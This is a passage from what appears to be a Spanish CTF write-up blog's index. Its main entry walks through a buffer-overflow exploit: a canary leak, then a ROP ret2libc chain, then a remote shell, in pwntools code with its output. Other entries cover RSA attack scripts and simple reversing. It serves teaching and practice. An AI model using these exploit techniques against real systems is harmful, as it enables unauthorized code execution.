\u0026amp;i, \u0026amp;dead); if(i \u0026lt;128) { printf(\"Enter your changes:\\n\u0026gt;\u0026gt;\u0026gt; \"); limit =0; while(true) { input_char =getchar(); if(((char) input_char =='\\n') ||(0x7e\u0026lt;limit)) break; *(char*) (i +param_1) =(char) input_char; limit =limit +1; i =i +1; } } else{ printf(\"That\\'s not a valid index!\"); } return; }  Aquí tenemos una manera de escribir hasta 0x7e (126) caracteres distintos de \\n en una posición de notes (un vector de char de 136 elementos).\nPor tanto, imaginemos que usamos el índice 127 e introducimos una gran cantidad de datos:\n$ ./notepad Welcome to Notepad as a Service! Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; 2 What index do you want to edit it at (0-127)? \u0026gt;\u0026gt;\u0026gt; 127 Enter your changes: \u0026gt;\u0026gt;\u0026gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; 3 *** stack smashing detected ***: terminated zsh: abort (core dumped) ./notepad  Aquí está. Tenemos una vulnerabilidad de Buffer Overflow y también vemos la protección del canario.\nVamos a usar GDB para ver dónde está el canario respecto a nuestra entrada de datos:\n$ gdb -q notepad Reading symbols from notepad... (No debugging symbols found in notepad) gef➤ run Starting program: ./notepad Welcome to Notepad as a Service! Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; 2 What index do you want to edit it at (0-127)? \u0026gt;\u0026gt;\u0026gt; 127 Enter your changes: \u0026gt;\u0026gt;\u0026gt; ABCDEFGH Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; ^C Program received signal SIGINT, Interrupt. 0x00007ffff7ecefd2 in __GI___libc_read (fd=0x0, buf=0x4052a0, nbytes=0x400) at ../sysdeps/unix/sysv/linux/read.c:26 26 ../sysdeps/unix/sysv/linux/read.c: No such file or directory.  gef➤ grep ABCDEFGH [+] Searching 'ABCDEFGH' in memory [+] In '[heap]'(0x405000-0x426000), permission=rw- 0x4052a0 - 0x4052aa → \"ABCDEFGH\\n\" [+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7ffff7f5b000-0x7ffff7fa9000), permission=r-- 0x7ffff7f69ea1 - 0x7ffff7f69ed8 → \"ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqr[...]\" 0x7ffff7f7902c - 0x7ffff7f79063 → \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx[...]\" 0x7ffff7f790ca - 0x7ffff7f790e4 → \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" 0x7ffff7f7911a - 0x7ffff7f7913e → \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\" [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw- 0x7fffffffe63f - 0x7fffffffe647 → \"ABCDEFGH\" gef➤ x/10gx 0x7fffffffe630 0x7fffffffe630: 0x0000000000000000 0x4100000000000000 0x7fffffffe640: 0x0048474645444342 0x017050fc6fd30b00 0x7fffffffe650: 0x00007fffffffe660 0x00000000004013b1 0x7fffffffe660: 0x0000000000000000 0x00007ffff7de5083 0x7fffffffe670: 0x00007ffff7ffc620 0x00007fffffffe758  El valor del canario es 0x017050fc6fd30b00, ya que el siguiente es el valor de $rbp guardado (0x7fffffffe660) y el siguiente es la dirección de retorno guardada (0x4013b1). Para poder burlar esta protección, tenemos que mostrarlo por pantalla. Una manera de hacer esto es añadir dos bytes más y mostrar su valor con view (necesitamos dos bytes adicionales para evitar el byte nulo que tiene el canario):\ngef➤ continue Continuing. 2 What index do you want to edit it at (0-127)? \u0026gt;\u0026gt;\u0026gt; 127 Enter your changes: \u0026gt;\u0026gt;\u0026gt; ABCDEFGHIJ Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; 1 Your note is Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt;  Sin embargo, necesitamos rellenar las otras notas. Ahora mismo, todas las notas tienen bytes nulos. Por eso no se ve nada, ya que los bytes nulos terminan las cadenas de caracteres en C.\nHabiendo dicho esto, vamos a empezar con el exploit para fugar el valor del canario:\n#!/usr/bin/env python3 frompwnimport* context.binary='notepad' elf=context.binary defget_process(): iflen(sys.argv) ==1: returnelf.process() host, port=sys.argv[1], sys.argv[2] returnremote(host, int(port)) defmain(): p=get_process() p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'2') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'0') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'A'*127) p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'2') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'127') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'B'*10) p.interactive() if__name__=='__main__': main()  $ python3 solve.py [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './notepad': pid 60556 [*] Switching to interactive mode Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; $ 1 Your note is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBI8\\x88\\x81%J\\xe9\\xe0\\xe8\\x8a\\x13\\x7f Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; $  Ahí está el canario, podemos añadir esta funcionalidad en el exploit:\np.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'1') note=p.recvline() canary=u64(b'\\0'+note.split(b'B'*10)[1][:7]) log.info(f'Canary: {hex(canary)}') p.interactive()  $ python3 solve.py [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './notepad': pid 114719 [*] Canary: 0x3a915786143fd700 [*] Switching to interactive mode Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; $  Para continuar con el proceso de explotación, tenemos que realizar un ataque Ret2Libc, ya que la protección NX está activada en el binario. Por tanto, tenemos que usar Return Oriented Programming (ROP) para ejecutar código arbitrario una vez que sobrescribamos la dirección de retorno.\nAdemás, necesitamos fugar una función de Glibc para burlar ASLR, que es muy probable que esté habilitado en la instancia remota. Para este propósito, tenemos que usar puts para mostrar el contenido de una función de Glibc en la Tabla de Offsets Globales (Global Offset Table, GOT), ya que mostrará el correspondiente valor de la Tabla de Enlaces a Procedimientos (Procedure Linkage Table, PLT) con la dirección exacta de la función de Glibc en tiempo de ejecución.\nPor tanto, necesitamos un gadget pop rdi; ret para poner la dirección de la GOT de una función (por ejemplo, la misma función puts) en $rdi (primer argumento). Luego llamamos a puts mediante la PLT y finalmente llamamos a main para continuar con la ejecución del programa.\nTodos estos valores se pueden obtener con los siguientes comandos:\n$ readelf -s notepad | grep main 6: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.2.5 (2) 57: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2 71: 000000000040138f 36 FUNC GLOBAL DEFAULT 14 main $ ROPgadget --binary notepad | grep 'pop rdi ; ret' 0x000000000040141b : pop rdi ; ret $ objdump -d notepad | grep puts 0000000000401030 \u0026lt;puts@plt\u0026gt;: 401030: ff 25 e2 2f 00 00 jmpq *0x2fe2(%rip) # 404018 \u0026lt;puts@GLIBC_2.2.5\u0026gt; 4011cf: e8 5c fe ff ff callq 401030 \u0026lt;puts@plt\u0026gt; 4012b9: e8 72 fd ff ff callq 401030 \u0026lt;puts@plt\u0026gt; 4012c5: e8 66 fd ff ff callq 401030 \u0026lt;puts@plt\u0026gt; 4012d1: e8 5a fd ff ff callq 401030 \u0026lt;puts@plt\u0026gt; 4012dd: e8 4e fd ff ff callq 401030 \u0026lt;puts@plt\u0026gt; 4012e9: e8 42 fd ff ff callq 401030 \u0026lt;puts@plt\u0026gt; 40136e: e8 bd fc ff ff callq 401030 \u0026lt;puts@plt\u0026gt;  No obstante, pwntools provee atributos útiles para acceder a estos valores, por lo que no tenemos que ponerlos hard-coded. La ROP chain tiene que incluir el valor del canario, para dejarlo sin moduficar (y burlar así la protección) e introducir un valor cualquiera de $rbp, como 0.\npop_rdi_ret_addr=0x40141b payload=b'B'*9 payload+=p64(canary) payload+=p64(0) payload+=p64(pop_rdi_ret_addr) payload+=p64(elf.got.puts) payload+=p64(elf.plt.puts) payload+=p64(elf.sym.main) p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'2') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'127') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', payload) p.interactive()  $ python3 solve.py [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './notepad': pid 125758 [*] Canary: 0xdcf713bcdc856e00 [*] Switching to interactive mode Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; $ 3 \\xc4\\x82\\xa7\\x7f Welcome to Notepad as a Service! Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; $  Y ahí está la dirección de la función puts en tiempo de ejecución. Vamos a cogerla y formatearla como número hexadecimal:\np.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'3') puts_addr=u64(p.recvline().strip(b'\\n').ljust(8, b'\\0')) log.info(f'Leaked puts() address: {hex(puts_addr)}') p.interactive()  $ python3 solve.py [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './notepad': pid 128245 [*] Canary: 0x4d5be7ce3e22000 [*] Leaked puts() address: 0x7fefe990a420 [*] Switching to interactive mode Welcome to Notepad as a Service! Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; $  Genial, estamos en el main de nuevo, por lo que tenemos que rellenar las notas otra vez. Ahora podemos obtener el offset de system y \u0026quot;/bin/sh\u0026quot; en Glibc, porque ya podemos calcular la dirección base de Glibc y burlar así ASLR. Estos son los offsets:\n$ ldd notepad linux-vdso.so.1 (0x00007ffe4512a000) libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff792757000) /lib64/ld-linux-x86-64.so.2 (0x00007ff79295f000) $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts 195: 0000000000084420 476 FUNC GLOBAL DEFAULT 15 _IO_puts@@GLIBC_2.2.5 430: 0000000000084420 476 FUNC WEAK DEFAULT 15 puts@@GLIBC_2.2.5 505: 0000000000124330 1268 FUNC GLOBAL DEFAULT 15 putspent@@GLIBC_2.2.5 692: 0000000000126000 728 FUNC GLOBAL DEFAULT 15 putsgent@@GLIBC_2.10 1160: 0000000000082ce0 384 FUNC WEAK DEFAULT 15 fputs@@GLIBC_2.2.5 1708: 0000000000082ce0 384 FUNC GLOBAL DEFAULT 15 _IO_fputs@@GLIBC_2.2.5 2345: 000000000008e320 159 FUNC WEAK DEFAULT 15 fputs_unlocked@@GLIBC_2.2.5 $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system 237: 0000000000153ae0 103 FUNC GLOBAL DEFAULT 15 svcerr_systemerr@@GLIBC_2.2.5 619: 0000000000052290 45 FUNC GLOBAL DEFAULT 15 __libc_system@@GLIBC_PRIVATE 1430: 0000000000052290 45 FUNC WEAK DEFAULT 15 system@@GLIBC_2.2.5 $ strings -atx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh 1b45bd /bin/sh  Ok, vamos a explotar el binario en local. Primero de todo, vamos a calcular la dirección base de Glibc y otras direcciones:\nputs_offset=0x084420 system_offset=0x052290 bin_sh_offset=0x1b45bd glibc_base_addr=puts_addr-puts_offset log.info(f'Glibc base address: {hex(glibc_base_addr)}') system_addr=glibc_base_addr+system_offset bin_sh_addr=glibc_base_addr+bin_sh_offset p.interactive()  $ python3 solve.py [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './notepad': pid 156756 [*] Canary: 0xf5acfc6170498100 [*] Leaked puts() address: 0x7fe306356420 [*] Glibc base address: 0x7fe3062d2000 [*] Switching to interactive mode Menu: 1) View note 2) Edit note 3) Quit and make new note \u0026gt;\u0026gt;\u0026gt; $  Como prueba, podemos ver que la dirección base de Glibc termina en 000 en hexadecimal, lo cual indica que está bien, en general.\nAhora, podemos utilizar otra ROP chain para llamar a system(\u0026quot;/bin/sh\u0026quot;). Esta vez, tenemos que añadir una un gadget ret para prevenir problemas con el alineamiento de la pila (stack alignment). Este gadget será el mismo que pop_rdi_addr más una unidad:\npayload=b'B'*9 payload+=p64(canary) payload+=p64(0) payload+=p64(pop_rdi_ret_addr) payload+=p64(bin_sh_addr) payload+=p64(pop_rdi_ret_addr+1) payload+=p64(system_addr) p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'2') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'127') p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', payload) p.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', b'3') p.interactive()  $ python3 solve.py [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process './notepad': pid 158722 [*] Canary: 0xb7a3e7f603b88800 [*] Leaked puts() address: 0x7fab1d9ab420 [*] Glibc base address: 0x7fab1d927000 [*] Switching to interactive mode $ ls notepad solve.py  Tenemos una shell! Perfecto, vamos a probar en remoto:\n$ python3 solve.py puzzler7.imaginaryctf.org 3001 [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to puzzler7.imaginaryctf.org on port 3001: Done [*] Canary: 0x86efa0d7c64bd600 [*] Leaked puts() address: 0x7f9b47528ed0 [*] Glibc base address: 0x7f9b474a4ab0 [*] Switching to interactive mode [*] Got EOF while reading in interactive $  Obviamente, no tenemos una shell porque la versión de Glibc en remoto es distinta de la local. Otro hecho es que la dirección base no termina en 000. Para tener la correcta, tenemos que coger los últimos tres dígitos hexadecimales de la dirección fugada de puts y buscar en libc.rip.\nPara obtener menos resultados, podemos fugar otra función como printf:\n$ python3 solve.py puzzler7.imaginaryctf.org 3001 [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to puzzler7.imaginaryctf.org on port 3001: Done [*] Canary: 0xc92ece03b2b45700 [*] Leaked printf() address: 0x7f867672d770 [*] Glibc base address: 0x7f86766a9350 [*] Switching to interactive mode [*] Got EOF while reading in interactive $  Ahora tenemos tres versiones candidatas de Glibc:\nSi actualizamos los offsets, tendremos uan shell en remoto:\n$ python3 solve.py puzzler7.imaginaryctf.org 3001 [*] './notepad' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to puzzler7.imaginaryctf.org on port 3001: Done [*] Canary: 0xaa26c4c98b274200 [*] Leaked puts() address: 0x7f921747ced0 [*] Glibc base address: 0x7f92173fc000 [*] Switching to interactive mode $ ls flag.txt run $ cat flag.txt ictf{gimme_2_months_and_I'll_put_microsoft_out_of_business}  El exploit completo se puede encontrar aquí: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/notepad-as-a-service/","section":"ctf","summary":"ImaginaryCTF 11/07/2022. 75 puntos. 64-bit binary. Buffer Overflow. Ret2Libc. Bypass de ASLR y canary","time":8,"title":"Notepad as a Service"},{"contents":"En este reto se nos da un archivo. El contenido de este archivo es la flag:\n$ cat flag picoCTF{s4n1ty_v3r1f13d_28e8376d}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/picoctf/general-skills/obedient-cat/","section":"ctf","summary":"picoCTF 2021. 5 puntos. Mostrar contenido de un archivo","time":0,"title":"Obedient Cat"},{"contents":"Se nos proporciona el código fuente en Python para cifrar la flag, y una aplicación Flask que llama a la función de cifrado:\nfromCrypto.Util.numberimportlong_to_bytes, bytes_to_long, getPrime, inverse importrandom FLAG=b'HTB{--REDACTED--}' p=getPrime(1024) q=getPrime(1024) n=p*q e=257 defencrypt_flag(): a=random.getrandbits(1024) b=random.getrandbits(1024) flag=bytes_to_long(FLAG) msg=a*flag+b ct=pow(msg, e, n) return{'ct': format(ct, 'x'), 'n': format(n, 'x'), 'e': format(e, 'x'), 'a': format(a, 'x'), 'b': format(b, 'x')}  fromflaskimport* fromchallimportencrypt_flag app=Flask(__name__) @app.route('/', methods=['GET']) defindex(): returnrender_template('index.html') @app.route('/api/get_flag', methods=['GET']) defget_flag(): payload=encrypt_flag() returnjsonify(payload) if__name__=='__main__': app.run(host='0.0.0.0', port=1337)  Podemos expresar los cálculos anteriores de un criptosistema RSA en términos matemáticos (sea $F$ la flag en formato decimal):\n$$ m = a \\cdot F + b $$\n$$ c = m ^ e \\pmod{n} = (a \\cdot F + b) ^ e \\pmod{n} $$\nTeniendo en cuenta que podemos llamar a encrypt_flag varias veces, podríamos matizar que:\n$$ c_i = (a_i \\cdot F + b_i) ^ e \\pmod{n} $$\nEsto es un claro ejemplo de ataque de Franklin-Reiter related-message, ya que podemos definir dos polinomios $f, g \\in \\mathbb{Z}/n\\mathbb{Z}[x]$ que relacionan dos textos cifrados:\n$$ f(x) = a_1 \\cdot x + b_1 \\qquad g(x) = a_2 \\cdot x + b_2 $$\nComo $f(F)^e - c_1 = 0$ y $g(F)^e - c_2 = 0$, los polinomios $f(x)^e - c_1$ y $g(x)^e - c_2$ comparten un factor común, que será un polinomio lineal $x - F$, cuya raíz es $F$.\nPodemos implementar el ataque en SageMath así:\ndefcomposite_modulus_gcd(f, g): ifg==0: returnf.monic() returncomposite_modulus_gcd(g, f%g) deffranklin_reiter(n, e, ct1, ct2, a1, a2, b1, b2): P.\u0026lt;x\u0026gt;=PolynomialRing(Zmod(n)) f=(a1*x +b1) ^e-ct1 g=(a2*x +b2) ^e-ct2 return -composite_modulus_gcd(f, g).coefficients()[0] % n  Nótese el uso de composite_modulus_gcd porque $\\mathbb{Z}/n\\mathbb{Z}$ no es un cuerpo finito, por lo que no podemos definir el Máximo Común Divisor (GCD) en este anillo de polinomios. Sin embargo, podemos aplicar el algoritmo de Euclides (más información en mathematica.stackexchange.com).\nLo único que falta es tomar los parámetros de cifrado de la aplicación Flask y realizar el ataque:\n$ sage solve.sage 104.248.162.85:32441 HTB{RSA_f1n1t3_d1ffs_@nd_r31473d_m355493_4774ck5_:eyes:}  El script completo se puede encontrar aquí: solve.sage.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/crypto/one-step-closer/","section":"ctf","summary":"RSA. Ataque de Franklin-Reiter related-message","time":1,"title":"One Step Closer"},{"contents":"Se nos proporciona el código fuente en Python utilizado para cifrar la flag:\n#!/usr/bin/env python3 fromCrypto.Util.numberimport* fromrandomimportseed, getrandbits m=bytes_to_long(open('flag.txt', 'rb').read()) print(\"What's your name?\\n\u0026gt;\u0026gt;\u0026gt; \", end='') name=open(0, 'rb').readline().strip() seed(bytes_to_long(name)) e=2*getrandbits(32)+1 p=getPrime(512) q=getPrime(512) n=p*q c=pow(m, e, n) print(f\"Here's your flag, {''.join(chr(i) foriinname)}!\") print(f'{n= }') print(f'{e= }') print(f'{c= }')  Utiliza una implementación de RSA en la que podemos proporcionar un nombre que será usado como semilla de un Generador de Números Pseudo-Aleatorios (PRNG, Pseudo-Random Number Generator). Luego, el exponente $e$ se calcula como 2 * getrandbits(32) + 1.\nCada vez que nos conectemos al servidor, el módulo público $n$ será diferente, pero si utilizamos el mismo nombre, el exponente $e$ siempre será el mismo. Por tanto, tenemos el siguiente sistema de congruencias:\n$$ \\begin{cases} m^e \\equiv c_1 \\pmod{n_1} \\newline m^e \\equiv c_2 \\pmod{n_2} \\newline m^e \\equiv c_3 \\pmod{n_3} \\newline \u0026hellip; \\newline m^e \\equiv c_k \\pmod{n_k} \\newline \\end{cases} $$\nDe acuerdo con el Teorema Chino del Resto (CRT, Chinese Remainder Theorem), este sistema de congruencias tiene una única solución módulo $n_1 \\cdot c_2 \\cdot \\dots \\cdot n_k$ siempre que todos los $n_i$ sean coprimos unos con otros (lo cual es cierto). Con las ecuaciones suficientes, obtendremos que $m^e \u0026lt; n_1 \\cdot c_2 \\cdot \\dots \\cdot n_k$, y la solución del CRT será precisamente $m^e$.\nLuego, el siguiente paso será hacer la raíz $e$-ésima para hallar $m$.\nPara que esta estrategia funcione, tenemos que encontrar un exponente $e$ que sea suficientemente pequeño, de manera que no tengamos que conseguir demasiados mensajes.\nUna iniciativa es utilizar fuerza bruta. Encontraremos que usando 8115501 (\u0026quot;{\\xd5-\u0026quot; en bytes) como semilla resultará en $e = 73$, que es suficientemente pequeño.\nPara que funcione el CRT, necesité 1000 pares de textos cifrados y módulos. A lo mejor son muchos, pero así aseguramos que el CRT funciona (importado desde SageMath en Python)\nEste es el script final:\n#!/usr/bin/env python3 fromgmpy2importiroot frompwnimportcontext, log, remote, sys fromrandomimportgetrandbits, seed from sage.all importCRT defmain(): iflen(sys.argv) !=3: log.warning(f'Usage: python3 {sys.argv[0]}\u0026lt;host\u0026gt; \u0026lt;port\u0026gt;') exit(1) host, port=sys.argv[1], sys.argv[2] seeds=log.progress('Seed') foriinrange(10000000): seeds.status(str(i)) seed(i) ifgetrandbits(32) \u0026lt;50: nice_seed=i break ifnice_seedisNone: log.warning('Could not find nice seed') exit(1) seeds.success(str(nice_seed)) name=bytes.fromhex(hex(nice_seed)[2:]) seed(nice_seed) e=2*getrandbits(32) +1 log.info(f'{e= }') ns, cs=[], [] connections=log.progress('Connections') foriinrange(1000): connections.status(str(i +1)) withcontext.local(log_level='CRITICAL'): r=remote(host, int(port)) r.sendlineafter(b'\u0026gt;\u0026gt;\u0026gt; ', name) r.recvuntil(b'n = ') ns.append(int(r.recvline().strip().decode())) r.recvuntil(b'c = ') cs.append(int(r.recvline().strip().decode())) r.close() connections.success(str(i)) m_e= CRT(cs, ns) m=iroot(m_e, e) log.success(f'Flag: {bytes.fromhex(hex(m[0])[2:]).decode()}') if__name__=='__main__': main()  Y obtenemos la flag:\n$ python3 solve.py puzzler7.imaginaryctf.org 4002 [+] Seed: 8115501 [*] e = 73 [+] Connections: 1000 [+] Flag: ictf{just_f0r_y0uuuuuuuu}  El script completo se puede encontrar aquí: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/personalized/","section":"ctf","summary":"ImaginaryCTF 07/08/2022. 75 puntos. RSA. Semilla de PRNG. CRT","time":1,"title":"Personalized"},{"contents":"Se nos proporciona un archivo llamado out.pickle. La flag está almacenada dentro, podemos visualizar su contenido en hexadecimal:\n$ xxd out.pickle 00000000: 8004 958c 0000 0000 0000 008c 085f 5f6d .............__m 00000010: 6169 6e5f 5f94 8c0b 466c 6167 5072 696e ain__...FlagPrin 00000020: 7465 7294 9394 2981 947d 9428 8c04 666c ter...)..}.(..fl 00000030: 6167 945d 9428 4b69 4b63 4b74 4b66 4b7b ag.].(KiKcKtKfK{ 00000040: 4b63 4b75 4b63 4b75 4b6d 4b62 4b65 4b72 KcKuKcKuKmKbKeKr 00000050: 4b73 4b5f 4b6f 4b72 4b5f 4b70 4b69 4b63 KsK_KoKrK_KpKiKc 00000060: 4b6b 4b6c 4b65 4b73 4b3f 4b7d 658c 0466 KkKlKeKsK?K}e..f 00000070: 616b 6594 8c1d 6a63 7466 7b63 3075 6c64 ake...jctf{c0uld 00000080: 5f74 6831 735f 6233 5f74 6833 5f66 6c34 _th1s_b3_th3_fl4 00000090: 673f 7d94 7562 2e g?}.ub.  En primer lugar, vemos una flag falsa: jctf{c0uld_th1s_b3_th3_fl4g?}. Pero si miramos más, vemos que la flag real está intercalada con letras K:\n$ head -c 108 out.pickle | tail -c 54 KiKcKtKfK{KcKuKcKuKmKbKeKrKsK_KoKrK_KpKiKcKkKlKeKsK?K} $ head -c 108 out.pickle | tail -c 54 | tr -d K ictf{cucumbers_or_pickles?}  Y la flag real es ictf{cucumbers_or_pickles?}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/pickle/","section":"ctf","summary":"ImaginaryCTF 06/07/2022. 50 puntos. Pickle de Python","time":0,"title":"Pickle"},{"contents":"Se nos proporciona un binario llamado rev1:\n$ file rev1 rev1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c5f9af621b132c2028d8e689cbb5b707f3f3cd28, not stripped  Si lo ejecutamos, el programa espera un PIN:\n$ ./rev1 Masukan PIN = 1234 PIN salah !  Vamos a depurarlo con GDB y a mostrar el código ensamblador del main:\n$ gdb -q rev1 Reading symbols from rev1... (No debugging symbols found in rev1) gef➤ disassemble main Dump of assembler code for function main: 0x00000000004005d6 \u0026lt;+0\u0026gt;: push rbp 0x00000000004005d7 \u0026lt;+1\u0026gt;: mov rbp,rsp 0x00000000004005da \u0026lt;+4\u0026gt;: sub rsp,0x10 0x00000000004005de \u0026lt;+8\u0026gt;: lea rdi,[rip+0xdf] # 0x4006c4 0x00000000004005e5 \u0026lt;+15\u0026gt;: mov eax,0x0 0x00000000004005ea \u0026lt;+20\u0026gt;: call 0x4004a0 \u0026lt;printf@plt\u0026gt; 0x00000000004005ef \u0026lt;+25\u0026gt;: lea rax,[rbp-0x4] 0x00000000004005f3 \u0026lt;+29\u0026gt;: mov rsi,rax 0x00000000004005f6 \u0026lt;+32\u0026gt;: lea rdi,[rip+0xd6] # 0x4006d3 0x00000000004005fd \u0026lt;+39\u0026gt;: mov eax,0x0 0x0000000000400602 \u0026lt;+44\u0026gt;: call 0x4004b0 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x0000000000400607 \u0026lt;+49\u0026gt;: mov eax,DWORD PTR [rbp-0x4] 0x000000000040060a \u0026lt;+52\u0026gt;: mov edi,eax 0x000000000040060c \u0026lt;+54\u0026gt;: call 0x4005b6 \u0026lt;cek\u0026gt; 0x0000000000400611 \u0026lt;+59\u0026gt;: test eax,eax 0x0000000000400613 \u0026lt;+61\u0026gt;: je 0x400623 \u0026lt;main+77\u0026gt; 0x0000000000400615 \u0026lt;+63\u0026gt;: lea rdi,[rip+0xba] # 0x4006d6 0x000000000040061c \u0026lt;+70\u0026gt;: call 0x400490 \u0026lt;puts@plt\u0026gt; 0x0000000000400621 \u0026lt;+75\u0026gt;: jmp 0x40062f \u0026lt;main+89\u0026gt; 0x0000000000400623 \u0026lt;+77\u0026gt;: lea rdi,[rip+0xba] # 0x4006e4 0x000000000040062a \u0026lt;+84\u0026gt;: call 0x400490 \u0026lt;puts@plt\u0026gt; 0x000000000040062f \u0026lt;+89\u0026gt;: mov eax,0x0 0x0000000000400634 \u0026lt;+94\u0026gt;: leave 0x0000000000400635 \u0026lt;+95\u0026gt;: ret End of assembler dump.  Aquí vemos que nuestros datos de entrada se pasan a cek, por lo que vamos a mostrar esta función:\ngef➤ disassemble cek Dump of assembler code for function cek: 0x00000000004005b6 \u0026lt;+0\u0026gt;: push rbp 0x00000000004005b7 \u0026lt;+1\u0026gt;: mov rbp,rsp 0x00000000004005ba \u0026lt;+4\u0026gt;: mov DWORD PTR [rbp-0x4],edi 0x00000000004005bd \u0026lt;+7\u0026gt;: mov eax,DWORD PTR [rip+0x200a7d] # 0x601040 \u0026lt;valid\u0026gt; 0x00000000004005c3 \u0026lt;+13\u0026gt;: cmp DWORD PTR [rbp-0x4],eax 0x00000000004005c6 \u0026lt;+16\u0026gt;: jne 0x4005cf \u0026lt;cek+25\u0026gt; 0x00000000004005c8 \u0026lt;+18\u0026gt;: mov eax,0x1 0x00000000004005cd \u0026lt;+23\u0026gt;: jmp 0x4005d4 \u0026lt;cek+30\u0026gt; 0x00000000004005cf \u0026lt;+25\u0026gt;: mov eax,0x0 0x00000000004005d4 \u0026lt;+30\u0026gt;: pop rbp 0x00000000004005d5 \u0026lt;+31\u0026gt;: ret End of assembler dump.  Podemos poner un breakpoint en la instrucción de comparación para que podemos ver qué PIN está esperando:\ngef➤ break *cek+13 Breakpoint 1 at 0x4005c3  Ahora ejecutamos el programa con cualquier PIN:\ngef➤ run Starting program: ./rev1 Masukan PIN = 1234 Breakpoint 1, 0x00000000004005c3 in cek ()  Y llegamos al breakpoint. El PIN esperado se guarda en $eax (también está en una variable global llamada valid):\ngef➤ p/x $eax $1 = 0x51615 gef➤ p/d $eax $2 = 333333 gef➤ p/d (int) valid $3 = 333333 gef➤ quit  Ahora tenemos el PIN correcto (333333):\n$ ./rev1 Masukan PIN = 333333 PIN benar !  Por lo que la flag es: CTFlearn{333333}.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/ctflearn/reverse-engineering/pin/","section":"ctf","summary":"Depuración de un programa para ver un PIN","time":1,"title":"PIN"},{"contents":"Se nos proporciona un binario de 64 bits llamado login:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: 